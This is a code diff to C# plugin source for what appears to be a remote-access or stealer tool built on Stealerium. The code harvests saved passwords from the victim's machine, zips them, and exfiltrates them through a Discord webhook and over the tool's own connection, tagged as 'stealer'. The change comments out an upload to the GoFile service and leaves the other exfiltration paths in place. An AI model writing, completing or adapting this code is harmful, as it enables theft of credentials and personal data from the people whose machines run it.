@@ -117,13 +117,13 @@ namespace Plugin
                             string savedir = Stealerium.Target.Passwords.Save();
                             //ziping file
                             string zipfilearchive = Filemanager.CreateArchive(savedir, false);
+                            /*
                             //uploadng file to gofile service
-                            
                             Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Started!");
                             string url = GofileFileService.UploadFile(zipfilearchive);
                             Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Ended\n{url}!");
-
-                            string info = GetSystemInfo(url);
+                            */
+                            string info = GetSystemInfo("");
                             Logging.Log($"Sending Report To Discord >> Started! \n({discordurl}) ");
                             Config.Webhook = discordurl;
                             DiscordWebHook.SendReport(info);
@@ -133,7 +133,7 @@ namespace Plugin
                             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                             msgpack.ForcePathObject("Pac_ket").AsString = "stealer";
 
-                            msgpack.ForcePathObject("info").AsString = GetSystemInfo(url);
+                            msgpack.ForcePathObject("info").AsString = info;
                             msgpack.ForcePathObject("zip").SetAsBytes(File.ReadAllBytes(zipfilearchive));
                             Connection.Send(msgpack.Encode2Bytes());
 
